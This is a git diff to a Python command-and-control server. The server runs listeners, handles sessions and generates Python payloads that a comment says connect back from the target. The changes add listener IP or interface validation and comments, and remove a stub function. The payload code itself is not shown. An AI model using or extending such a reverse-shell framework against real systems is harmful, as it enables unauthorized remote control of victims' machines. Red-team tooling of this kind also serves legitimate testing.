@@ -1,5 +1,4 @@
 import socket
-import sys
 import threading
 from prettytable import PrettyTable
 import time
@@ -9,6 +8,8 @@ import string
 import os
 import shutil
 import platform
+import ipaddress
+import netifaces as ni
 
 
 def banner():
@@ -93,12 +94,45 @@ def session_handler(session_id):
         print(response)
 
 
+# Validate if IPv4 address is valid
+def is_valid_ipv4(ip):
+    try:
+        ipaddress.IPv4Address(ip)
+        return True
+    except ipaddress.AddressValueError:
+        return False
+
+
+# Validation if network interface is valid
+def is_valid_interface(interface):
+    return interface in ni.interfaces()
+
+
+# Resolve IPv4 Address based on provided network interface
+def resolve_ip(interface):
+    ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
+    return ip
+
+
+# Validate user input for either IPv4 or Network interface; Resolve Network Interface to IPv4; Return IPv4
+def check_input(input_str):
+    if is_valid_ipv4(input_str):
+        return input_str
+    elif is_valid_interface(input_str):
+        resolved_ip = resolve_ip(input_str)
+        return resolved_ip
+    else:
+        return False
+
+
+# Generate a string with random lowercase ascii characters based on the length provided
 def generate_random_string(length):
     characters = string.ascii_lowercase
     random_string = ''.join(random.choice(characters) for _ in range(length))
     return random_string
 
 
+# Create a python script (payload) that can be used on the target to connect back to server based on the listener IP,PORT
 def generate_payload():
     name_generator = generate_random_string(6)
     # file_name = f'{name_generator}.py'
@@ -125,13 +159,7 @@ def generate_payload():
         f.write(file_content)
 
     print(
-        f'Python payload for host {host_ip}:{host_port} saved as {file_name}')
-
-
-def exeplant():
-    name_generator = generate_random_string(6)
-    file_name = f'{name_generator}.py'
-    print(file_name)
+        f'Python payload for command server {host_ip}:{host_port} saved as {file_name} in current directory.')
 
 
 if __name__ == '__main__':
@@ -144,9 +172,18 @@ if __name__ == '__main__':
         try:
             command = input('Enter command#> ')
             if command == 'start listener':
-                host_ip = input(
-                    '[*] Enter Local Host IP: ')
+                while True:
+                    user_input = input(
+                        "Enter an IPv4 address or a network interface name: ")
+                    if check_input(user_input) is not False:
+                        host_ip = check_input(user_input)
+                        print(f'lhost ==> {host_ip}')
+                        break
+                    else:
+                        print(
+                            f"\'{user_input}\' is neither a valid IPv4 address nor a valid network interface name.")
                 host_port = input('[*] Enter Local Port to listen on: ')
+                print(f'lport ==> {host_port}')
                 listener_handler()
                 listener_counter += 1
             if command.split(' ')[0] == 'sessions':
